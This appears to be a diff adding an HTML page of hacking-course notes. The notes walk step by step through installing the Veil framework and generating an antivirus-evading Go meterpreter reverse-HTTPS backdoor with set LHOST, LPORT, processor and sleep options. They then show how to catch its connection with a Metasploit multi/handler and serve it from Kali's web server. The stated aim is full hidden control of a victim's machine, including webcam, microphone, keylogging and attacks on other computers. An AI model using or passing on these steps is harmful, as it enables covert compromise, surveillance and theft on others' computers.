@@ -1,0 +1,86 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Full-Access</title>
+</head><body><b>VEIL-FRAMEWORK<br/>
+<br/>
+</b>-A backdoor is a file that gives us full control over the machine that it gets executed on<br/>
+-Backdoors can be caught by Anti-Virus programs<br/>
+-Veil is a framework for generating Undetectable backdoors<br/>
+<br/>
+<b>install:</b><br/>
+<br/>
+#cd /opt<br/>
+#git clone https://github.com/Veil-Framework/Veil.git<br/>
+#cd Veil/config<br/>
+#./setup.sh --silent --force<br/>
+#sudo apt autoremove(optional)<br/>
+#python -m pip install --upgrade pip(optional)<br/>
+------------------------------------------------------------------------<br/>
+To Run the program:<br/>
+#cd /opt/Veil<br/>
+#./Veil.py<br/>
+<br/>
+<b>Veil tools:</b><br/>
+<br/>
+1-Evasion: generates undetectible backdoors for us<br/>
+2-Ordnance: generates the payloads that's used by Evasion so you can look at this as a helper or secondary tool, payload mean part of the code of the backdoor does evil stuff<br/>
+<br/>
+Veil&gt;:list<br/>
+Veil&gt;: use 1<br/>
+Veil/Evasion&gt;: list<br/>
+Veil/Evasion&gt;: use 15<br/>
+[go/meterpreter/rev_https&gt;&gt;]: set LHOST 10.0.2.4<br/>
+[go/meterpreter/rev_https&gt;&gt;]: set LPORT 8080<br/>
+[go/meterpreter/rev_https&gt;&gt;]: set PROCESSORS 1<br/>
+[go/meterpreter/rev_https&gt;&gt;]: set SLEEP 6<br/>
+[go/meterpreter/rev_https&gt;&gt;]: options <br/>
+[go/meterpreter/rev_https&gt;&gt;]: generate<br/>
+:rev_https_8080 (name the backdoor)<br/>
+<br/>
+<br/>
+ex for payload:<br/>
+<b>go/meterpreter/rev_https.py: </b>go--&gt;refers to the programming language that the payload(evil code) is going to be wrapped, meterpreter--&gt;is the type of the payload which is designed by metasploit, meterpreter runs into memory and it allows us to migrate between system processes so we can have the payload or the backdoor running from a normal process like explorer, and this payload will allow us to gain full control so we able to navigate through file system download upload files turn on the mike turn on the cam, even use that computer to hack other computer, install keyloger, you can literally do anything you can think of, all of this will be running from the memory from a normal process on the system so it's very hard to detect and it doesn't leave a lot of footprints, rev_https.py--&gt;is the method that's going to be used to establish the connection, rev--&gt;mean reverse which mean the connection is going to come from the target computer to my own computer, what's going to happen is once the person double clicks the backdoor the backdoor will connect back to me,what's cool about this is i'll be able to bypass antivirus programs because the connection is not going to the target computer but reverse, so it's literally as if the target person is just connecting to a normal website, i'm going to use a port that websites use which 80 or 8080<br/>
+<br/>
+--&gt;LHOST: is the IP address which you're going to be receiving the connections on, we are going to set the IP host to the IP of kali machine (10.0.2.4)<br/>
+<br/>
+--&gt;LPORT: is the port which run webserver 8080 because we will need 80 in another stuff<br/>
+<br/>
+<b>Note:</b>&nbsp;if you generate the backdoor like this you will bypass all antiviurs programs except AVG, the way antivirus programs work is they have a very large database of signatures these signatures correspond to files that contain harmful code so it compare the signature of your file of backdoor to all files they have, so the main point is we're going to try to modify the our backdoor as much as possible to make it more unique so that it bypasses the signature database of antivirus<br/>
+<br/>
+<b>To make backdoor unique:</b><br/>
+<br/>
+1-modify processor to minimum number of processors to be used by the backdoor<br/>
+<br/>
+2-sleep option that lets the backdoor sleep number of seconds before execute evil code<br/>
+<br/>
+<br/>
+--&gt;we will test our backdoor which in : /var/lib/veil/output/compiled/rev_https_8080.exe <br/>
+on (no distribute) website<br/>
+<br/>
+<br/>
+<b>listen to our backdoor:</b><br/>
+<br/>
+#msfconsole (to run metasploit)<br/>
+msf5&gt;use exploit/multi/handler (allows us to listen for incoming connections)<br/>
+msf5 exploit(multi/handler) &gt;set PAYLOAD windows/meterpreter/reverse_https<br/>
+(should match OS of machine that you want to hack and should match the backdoor)<br/>
+msf5 exploit(multi/handler) &gt;set LHOST 10.0.2.4<br/>
+msf5 exploit(multi/handler) &gt;set LPORT 8080<br/>
+msf5 exploit(multi/handler) &gt;show options<br/>
+msf5 exploit(multi/handler) &gt;exploit<br/>
+--&gt;if client execute your evil file or make update<br/>
+meterpreter&gt;sysinfo<br/>
+meterpreter&gt;pwd<br/>
+------------------------------------------------------------------------------<br/>
+in another shell:<br/>
+#service apache2 start<br/>
+<br/>
+<br/>
+<br/>
+--&gt;kali comes with webserver that means that you can use kali as a website<br/>
+<br/>
+<b>meterpreter</b>--&gt;do anything that the user can do on their computer<br/>
+<br/>
+</body></html>
